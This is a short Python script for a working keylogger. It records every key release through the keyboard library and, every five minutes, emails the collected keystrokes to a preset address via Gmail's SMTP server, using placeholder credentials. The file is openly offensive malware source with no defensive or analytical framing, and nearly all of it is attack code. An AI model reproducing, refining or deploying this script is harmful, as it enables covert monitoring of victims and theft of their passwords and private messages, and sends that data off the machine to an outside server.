
#!/usr/bin/python3.8

import keyboard
import smtplib
from threading import Semaphore, Timer
# Semaphore is used to block the current thread and Timer to run a method after some time

EMAIL_ADDRESS = "YOUR_EMAIL@gmail.com"
EMAIL_PASSWORD = "YOUR_EMAIL_PASSWD"
SEND_TIMING = 300 #Seconds -> 5minutes


class Keylog:

	def __init__(self, interval):

		#Assigning SEND_TIMING to time
		self.interval = interval

		# String that contains the log of all keystrokes collected within 'self.time'
		self.log = ""

		#Block after the on_release listener
		self.semaphore = Semaphore(0)


	def callback(self,event):

		#The callback fuction invoke when a keyboad event is occured

		name = event.name
		if len(name) > 1:

			if name == "space":
				name= " "


			elif name == "enter":
				name = "[ENTER]\n"


			elif	name == "decimal":
				name = "."


			else:
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"

		self.log +=name


	def sendmail (self, email, password, message):

		server = smtplib.SMTP(host="smtp.gmail.com", port=587)
		server.starttls() #connect to the SMTP serveras TLS mode
		server.login(email,password)
		server.sendmail(email, email, message) #Send the message
		server.quit()


	def report(self):

		if self.log:
			self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD,self.log)

		self.log = ""

		Timer(interval=self.interval, function=self.report).start()


	def start(self):

		#Keylogger start
		keyboard.on_release(callback=self.callback)

		#Report the logs
		self.report()

		#Block the current thread
		#on_release() doesn't block it
		#because it listen on a separate thread
		self.semaphore.acquire()


#Program Start Here
if __name__ == "__main__":

	keylog = Keylog(interval=SEND_TIMING)
	keylog.start()
